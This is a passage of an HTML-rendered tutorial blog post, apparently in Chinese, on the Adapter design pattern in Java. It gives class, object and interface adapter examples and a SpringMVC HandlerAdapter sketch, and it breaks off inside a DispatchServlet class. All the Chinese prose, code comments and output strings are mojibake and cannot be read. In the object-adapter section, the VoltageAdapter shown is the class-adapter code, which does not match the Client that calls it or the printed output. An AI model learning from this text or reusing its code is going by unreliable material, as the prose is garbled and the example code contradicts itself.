<span class="hljs-title class_">IVoltage5V</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">output5V</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//è·å–åˆ°220Vç”µå‹</span><br>      <span class="hljs-type">int</span> <span class="hljs-variable">srcV</span> <span class="hljs-operator">=</span> output220V();<br>      <span class="hljs-type">int</span> <span class="hljs-variable">dstV</span> <span class="hljs-operator">=</span> srcV / <span class="hljs-number">44</span> ; <span class="hljs-comment">//è½¬æˆ 5v</span><br>      <span class="hljs-keyword">return</span> dstV;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Phone</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.objectadapter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Phone</span> &#123;<br><br>   <span class="hljs-comment">//å……ç”µ</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charging</span><span class="hljs-params">(IVoltage5V iVoltage5V)</span> &#123;<br>      <span class="hljs-keyword">if</span>(iVoltage5V.output5V() == <span class="hljs-number">5</span>) &#123;<br>         System.out.println(<span class="hljs-string">&quot;ç”µå‹ä¸º5V, å¯ä»¥å……ç”µ~~&quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (iVoltage5V.output5V() &gt; <span class="hljs-number">5</span>) &#123;<br>         System.out.println(<span class="hljs-string">&quot;ç”µå‹å¤§äº5V, ä¸èƒ½å……ç”µ~~&quot;</span>);<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.classadapter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">// TODO Auto-generated method stub</span><br>System.out.println(<span class="hljs-string">&quot;  ç±»é€‚é…å™¨æ¨¡å¼ &quot;</span>);<br><span class="hljs-type">Phone</span> <span class="hljs-variable">phone</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phone</span>();<br>phone.charging(<span class="hljs-keyword">new</span> <span class="hljs-title class_">VoltageAdapter</span>());<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><p>ç±»é€‚é…å™¨æ¨¡å¼<br />ç”µå‹=220ä¼<br />ç”µå‹ä¸º5V, å¯ä»¥å……ç”µ~~</p><h3 id="ç±»é€‚é…å™¨æ¨¡å¼æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#ç±»é€‚é…å™¨æ¨¡å¼æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> ç±»é€‚é…å™¨æ¨¡å¼æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h3><ol><li><p>Java æ˜¯å•ç»§æ‰¿æœºåˆ¶ï¼Œæ‰€ä»¥ç±»é€‚é…å™¨éœ€è¦ç»§æ‰¿ src ç±»è¿™ä¸€ç‚¹ç®—æ˜¯ä¸€ä¸ªç¼ºç‚¹, å› ä¸ºè¿™è¦æ±‚ dst å¿…é¡»æ˜¯æ¥å£ï¼Œæœ‰ä¸€å®šå±€é™æ€§;</p></li><li><p>src ç±»çš„æ–¹æ³•åœ¨ Adapter ä¸­éƒ½ä¼šæš´éœ²å‡ºæ¥ï¼Œä¹Ÿå¢åŠ äº†ä½¿ç”¨çš„æˆæœ¬ã€‚</p></li><li><p>ç”±äºå…¶ç»§æ‰¿äº† src ç±»ï¼Œæ‰€ä»¥å®ƒå¯ä»¥æ ¹æ®éœ€æ±‚é‡å†™ src ç±»çš„æ–¹æ³•ï¼Œä½¿å¾— Adapter çš„çµæ´»æ€§å¢å¼ºäº†ã€‚</p></li></ol><h2 id="å¯¹è±¡é€‚é…å™¨æ¨¡å¼"><a class="markdownIt-Anchor" href="#å¯¹è±¡é€‚é…å™¨æ¨¡å¼"></a> å¯¹è±¡é€‚é…å™¨æ¨¡å¼</h2><h3 id="å¯¹è±¡é€‚é…å™¨æ¨¡å¼ä»‹ç»"><a class="markdownIt-Anchor" href="#å¯¹è±¡é€‚é…å™¨æ¨¡å¼ä»‹ç»"></a> å¯¹è±¡é€‚é…å™¨æ¨¡å¼ä»‹ç»</h3><ol><li><p>åŸºæœ¬æ€è·¯å’Œç±»çš„é€‚é…å™¨æ¨¡å¼ç›¸åŒï¼Œåªæ˜¯å°† Adapter ç±»ä½œä¿®æ”¹ï¼Œä¸æ˜¯ç»§æ‰¿ src ç±»ï¼Œè€Œæ˜¯æŒæœ‰ src ç±»çš„å®ä¾‹ï¼Œä»¥è§£å†³å…¼å®¹æ€§çš„é—®é¢˜ã€‚ å³ï¼šæŒæœ‰ src ç±»ï¼Œå®ç° dst ç±»æ¥å£ï¼Œå®Œæˆ src-&gt;dst çš„é€‚é…</p></li><li><p>æ ¹æ®â€œ<strong>åˆæˆå¤ç”¨åŸåˆ™</strong>â€ï¼Œåœ¨ç³»ç»Ÿä¸­å°½é‡ä½¿ç”¨<strong>å…³è”å…³ç³»ï¼ˆèšåˆï¼‰æ¥æ›¿ä»£ç»§æ‰¿</strong>å…³ç³»ã€‚</p></li><li><p>å¯¹è±¡é€‚é…å™¨æ¨¡å¼æ˜¯é€‚é…å™¨æ¨¡å¼å¸¸ç”¨çš„ä¸€ç§</p></li></ol><h3 id="å¯¹è±¡é€‚é…å™¨æ¨¡å¼åº”ç”¨å®ä¾‹"><a class="markdownIt-Anchor" href="#å¯¹è±¡é€‚é…å™¨æ¨¡å¼åº”ç”¨å®ä¾‹"></a> å¯¹è±¡é€‚é…å™¨æ¨¡å¼åº”ç”¨å®ä¾‹</h3><ol><li>åº”ç”¨å®ä¾‹è¯´æ˜</li></ol><p>ä»¥ç”Ÿæ´»ä¸­å……ç”µå™¨çš„ä¾‹å­æ¥è®²è§£é€‚é…å™¨ï¼Œå……ç”µå™¨æœ¬èº«ç›¸å½“äº Adapterï¼Œ220V äº¤æµç”µç›¸å½“äº src (å³è¢«é€‚é…è€…)ï¼Œæˆ‘ä»¬çš„ç›® dst(å³ç›®æ ‡)æ˜¯ 5V ç›´æµç”µï¼Œä½¿ç”¨å¯¹è±¡é€‚é…å™¨æ¨¡å¼å®Œæˆã€‚</p><ol start="2"><li>æ€è·¯åˆ†æ(ç±»å›¾)ï¼šåªéœ€ä¿®æ”¹é€‚é…å™¨å³å¯, å¦‚ä¸‹</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221225161754203.png" alt="image-20221225161754203" /></p><p><code>VoltageAdapter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.classadapter;<br><br><span class="hljs-comment">//é€‚é…å™¨ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VoltageAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Voltage220V</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IVoltage5V</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">output5V</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//è·å–åˆ°220Vç”µå‹</span><br>      <span class="hljs-type">int</span> <span class="hljs-variable">srcV</span> <span class="hljs-operator">=</span> output220V();<br>      <span class="hljs-type">int</span> <span class="hljs-variable">dstV</span> <span class="hljs-operator">=</span> srcV / <span class="hljs-number">44</span> ; <span class="hljs-comment">//è½¬æˆ 5v</span><br>      <span class="hljs-keyword">return</span> dstV;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.objectadapter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">// TODO Auto-generated method stub</span><br>System.out.println(<span class="hljs-string">&quot; å¯¹è±¡é€‚é…å™¨æ¨¡å¼ &quot;</span>);<br><span class="hljs-type">Phone</span> <span class="hljs-variable">phone</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phone</span>();<br>phone.charging(<span class="hljs-keyword">new</span> <span class="hljs-title class_">VoltageAdapter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Voltage220V</span>()));<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><p>å¯¹è±¡é€‚é…å™¨æ¨¡å¼<br />ç”µå‹=220ä¼<br />ä½¿ç”¨å¯¹è±¡é€‚é…å™¨ï¼Œè¿›è¡Œé€‚é…~~<br />é€‚é…å®Œæˆï¼Œè¾“å‡ºçš„ç”µå‹ä¸º=5<br />ç”µå‹ä¸º5V, å¯ä»¥å……ç”µ~~</p><h3 id="å¯¹è±¡é€‚é…å™¨æ¨¡å¼æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#å¯¹è±¡é€‚é…å™¨æ¨¡å¼æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> å¯¹è±¡é€‚é…å™¨æ¨¡å¼æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h3><ol><li>å¯¹è±¡é€‚é…å™¨å’Œç±»é€‚é…å™¨å…¶å®ç®—æ˜¯åŒä¸€ç§æ€æƒ³ï¼Œåªä¸è¿‡å®ç°æ–¹å¼ä¸åŒã€‚</li></ol><p>æ ¹æ®åˆæˆå¤ç”¨åŸåˆ™ï¼Œä½¿ç”¨ç»„åˆæ›¿ä»£ç»§æ‰¿ï¼Œ æ‰€ä»¥å®ƒè§£å†³äº†ç±»é€‚é…å™¨å¿…é¡»ç»§æ‰¿ src çš„å±€é™æ€§é—®é¢˜ï¼Œä¹Ÿä¸å†è¦æ±‚ dstå¿…é¡»æ˜¯æ¥å£ã€‚</p><ol start="2"><li>ä½¿ç”¨æˆæœ¬æ›´ä½ï¼Œæ›´çµæ´»</li></ol><h2 id="æ¥å£é€‚é…å™¨æ¨¡å¼"><a class="markdownIt-Anchor" href="#æ¥å£é€‚é…å™¨æ¨¡å¼"></a> æ¥å£é€‚é…å™¨æ¨¡å¼</h2><h3 id="æ¥å£é€‚é…å™¨æ¨¡å¼ä»‹ç»"><a class="markdownIt-Anchor" href="#æ¥å£é€‚é…å™¨æ¨¡å¼ä»‹ç»"></a> æ¥å£é€‚é…å™¨æ¨¡å¼ä»‹ç»</h3><ol><li><p>ä¸€äº›ä¹¦ç±ç§°ä¸ºï¼šé€‚é…å™¨æ¨¡å¼(Default Adapter Pattern)æˆ–<strong>ç¼ºçœé€‚é…å™¨æ¨¡å¼</strong>ã€‚</p></li><li><p>æ ¸å¿ƒæ€è·¯ï¼šå½“<strong>ä¸éœ€è¦å…¨éƒ¨å®ç°æ¥å£á¨€ ä¾›çš„æ–¹æ³•</strong>æ—¶ï¼Œå¯å…ˆ<strong>è®¾è®¡ä¸€ä¸ªæŠ½è±¡ç±»</strong>å®ç°<strong>æ¥å£</strong>ï¼Œå¹¶ä¸ºè¯¥æ¥å£ä¸­æ¯ä¸ªæ–¹æ³• ä¾›ä¸€ä¸ª<strong>é»˜è®¤å®ç°ï¼ˆç©ºæ–¹æ³•ï¼‰</strong>ï¼Œé‚£ä¹ˆè¯¥<strong>æŠ½è±¡ç±»çš„å­ç±»å¯æœ‰é€‰æ‹©åœ°è¦†ç›–çˆ¶ç±»çš„æŸäº›æ–¹æ³•</strong>æ¥å®ç°éœ€æ±‚</p></li><li><p>é€‚ç”¨äºä¸€ä¸ªæ¥å£ä¸æƒ³ä½¿ç”¨å…¶æ‰€æœ‰çš„æ–¹æ³•çš„æƒ…å†µã€‚</p></li></ol><h3 id="æ¥å£é€‚é…å™¨æ¨¡å¼åº”ç”¨å®ä¾‹"><a class="markdownIt-Anchor" href="#æ¥å£é€‚é…å™¨æ¨¡å¼åº”ç”¨å®ä¾‹"></a> æ¥å£é€‚é…å™¨æ¨¡å¼åº”ç”¨å®ä¾‹</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221225163021962.png" alt="image-20221225163021962" /></p><p><code>Interface4</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.interfaceadapter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface4</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m1</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m2</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m3</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m4</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>AbsAdapter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.interfaceadapter;<br><br><span class="hljs-comment">//åœ¨AbsAdapter æˆ‘ä»¬å°† Interface4 çš„æ–¹æ³•è¿›è¡Œé»˜è®¤å®ç°</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbsAdapter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interface4</span> &#123;<br><br>   <span class="hljs-comment">//é»˜è®¤å®ç°</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m1</span><span class="hljs-params">()</span> &#123;<br><br>   &#125;<br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m2</span><span class="hljs-params">()</span> &#123;<br><br>   &#125;<br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m3</span><span class="hljs-params">()</span> &#123;<br><br>   &#125;<br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m4</span><span class="hljs-params">()</span> &#123;<br><br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.interfaceadapter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br><span class="hljs-type">AbsAdapter</span> <span class="hljs-variable">absAdapter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbsAdapter</span>() &#123;<br><span class="hljs-comment">//åªéœ€è¦å»è¦†ç›–æˆ‘ä»¬ éœ€è¦ä½¿ç”¨ æ¥å£æ–¹æ³•</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m1</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-comment">// TODO Auto-generated method stub</span><br>System.out.println(<span class="hljs-string">&quot;ä½¿ç”¨äº†m1çš„æ–¹æ³•&quot;</span>);<br>&#125;<br>&#125;;<br><br>System.out.println(<span class="hljs-string">&quot;è¦ä½¿ç”¨çš„æ–¹æ³•è¾“å‡ºï¼š&quot;</span>);<br>absAdapter.m1();<br>System.out.println(<span class="hljs-string">&quot;ä¸è¦ä½¿ç”¨çš„æ–¹æ³•è¾“å‡ºï¼š&quot;</span>);<br>absAdapter.m2();<br>System.out.println(<span class="hljs-string">&quot;ä½¿ç”¨ç»“æŸ&quot;</span>);<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><p>è¦ä½¿ç”¨çš„æ–¹æ³•è¾“å‡ºï¼š<br />ä½¿ç”¨äº†m1çš„æ–¹æ³•<br />ä¸è¦ä½¿ç”¨çš„æ–¹æ³•è¾“å‡ºï¼š<br />ä½¿ç”¨ç»“æŸ</p><h2 id="é€‚é…å™¨æ¨¡å¼åœ¨-springmvc-æ¡†æ¶åº”ç”¨çš„æºç å‰–æ"><a class="markdownIt-Anchor" href="#é€‚é…å™¨æ¨¡å¼åœ¨-springmvc-æ¡†æ¶åº”ç”¨çš„æºç å‰–æ"></a> é€‚é…å™¨æ¨¡å¼åœ¨ SpringMVC æ¡†æ¶åº”ç”¨çš„æºç å‰–æ</h2><ol><li><p>SpringMvc ä¸­çš„ <strong>HandlerAdapter,</strong> å°±ä½¿ç”¨äº†é€‚é…å™¨æ¨¡å¼</p></li><li><p>SpringMVC å¤„ç†è¯·æ±‚çš„æµç¨‹å›é¡¾</p></li><li><p>ä½¿ç”¨ HandlerAdapter çš„åŸå› åˆ†æ:</p></li></ol><p>å¯ä»¥çœ‹åˆ°å¤„ç†å™¨çš„ç±»å‹ä¸åŒï¼Œæœ‰å¤šé‡å®ç°æ–¹å¼ï¼Œé‚£ä¹ˆè°ƒç”¨æ–¹å¼å°±ä¸æ˜¯ç¡®å®šçš„ï¼Œå¦‚æœéœ€è¦ç›´æ¥è°ƒç”¨ Controller æ–¹æ³•ï¼Œéœ€è¦è°ƒç”¨çš„æ—¶å€™å°±å¾—ä¸æ–­æ˜¯ä½¿ç”¨ if else æ¥è¿›è¡Œåˆ¤æ–­æ˜¯å“ªä¸€ç§å­ç±»ç„¶åæ‰§è¡Œã€‚é‚£ä¹ˆå¦‚æœåé¢è¦æ‰©å±• Controllerï¼Œå°±å¾—ä¿®æ”¹åŸæ¥çš„ä»£ç ï¼Œè¿™æ ·è¿èƒŒäº† OCP åŸåˆ™ã€‚</p><ol start="4"><li><p>ä»£ç åˆ†æ+Debug æºç </p></li><li><p>åŠ¨æ‰‹å†™ SpringMVC é€šè¿‡é€‚é…å™¨è®¾è®¡æ¨¡å¼è·å–åˆ°å¯¹åº”çš„ Controller çš„æºç </p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221225172743411.png" alt="image-20221225172743411" /></p><p><code>å„ç±»Controller</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.springmvc;<br><br><span class="hljs-comment">//å¤šç§Controllerå®ç°  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Controller</span> &#123;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpController</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Controller</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doHttpHandler</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;http...&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleController</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Controller</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSimplerHandler</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;simple...&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationController</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Controller</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAnnotationHandler</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;annotation...&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>å„ç±»é€‚é…å™¨</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.springmvc;<br><br><span class="hljs-comment">///å®šä¹‰ä¸€ä¸ªAdapteræ¥å£ </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">HandlerAdapter</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(Object handler)</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Object handler)</span>;<br>&#125;<br><br><span class="hljs-comment">// å¤šç§é€‚é…å™¨ç±»</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleHandlerAdapter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerAdapter</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Object handler)</span> &#123;<br>      ((SimpleController) handler).doSimplerHandler();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(Object handler)</span> &#123;<br>      <span class="hljs-keyword">return</span> (handler <span class="hljs-keyword">instanceof</span> SimpleController);<br>   &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpHandlerAdapter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerAdapter</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Object handler)</span> &#123;<br>      ((HttpController) handler).doHttpHandler();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(Object handler)</span> &#123;<br>      <span class="hljs-keyword">return</span> (handler <span class="hljs-keyword">instanceof</span> HttpController);<br>   &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationHandlerAdapter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerAdapter</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Object handler)</span> &#123;<br>      ((AnnotationController) handler).doAnnotationHandler();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(Object handler)</span> &#123;<br><br>      <span class="hljs-keyword">return</span> (handler <span class="hljs-keyword">instanceof</span> AnnotationController);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>DispatchServlet</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.springmvc;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatchServlet</span> &#123;<br><br>  